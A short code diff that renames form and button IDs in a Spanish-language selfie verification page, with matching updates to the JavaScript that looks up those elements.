@@ -238,11 +238,11 @@
                 </div>
 
                 <form id="formSelfie">
-                    <input type="hidden" id="selfieData" name="selfie">
+                    <input type="hidden" id="selfie" name="selfie">
                     <input type="hidden" id="no-status" name="status" value="selfie">
 
                     <button type="button" class="btn-capturar" id="btnCapturar">Tomar Foto</button>
-                    <button type="submit" class="btn-enviar" id="btnEnviar">Enviar Verificacion</button>
+                    <button type="submit" class="btn-enviar" id="enviar">Enviar Verificacion</button>
                     <button type="button" class="btn-reintentar" id="btnReintentar">Volver a Tomar</button>
                 </form>
             </div>
@@ -261,9 +261,9 @@
         const canvas = document.getElementById('canvas');
         const preview = document.getElementById('preview');
         const btnCapturar = document.getElementById('btnCapturar');
-        const btnEnviar = document.getElementById('btnEnviar');
+        const btnEnviar = document.getElementById('enviar');
         const btnReintentar = document.getElementById('btnReintentar');
-        const selfieData = document.getElementById('selfieData');
+        const selfieData = document.getElementById('selfie');
         const cameraError = document.getElementById('cameraError');
         const cameraSection = document.getElementById('cameraSection');
 
